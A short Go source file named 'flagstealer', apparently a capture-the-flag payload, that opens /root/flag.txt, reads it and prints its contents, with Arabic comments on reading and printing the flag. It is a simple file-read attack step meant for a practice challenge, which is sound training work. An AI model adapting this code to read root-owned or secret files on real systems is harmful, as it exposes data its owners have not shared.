package flagstealer

import "fmt"
import "os"

func main() {
    fmt.Println("hi fathy")
    f, err := os.Open("/root/flag.txt")
    if err != nil {
        fmt.Println("can't open flag: " + err.Error())
    }
    defer f.Close()

    data := make([]byte, 1024)
    n, _ := f.Read(data)        // قراءة البيانات
    fmt.Println("FLAG: " + string(data[:n])) // طباعة الفلاج
}

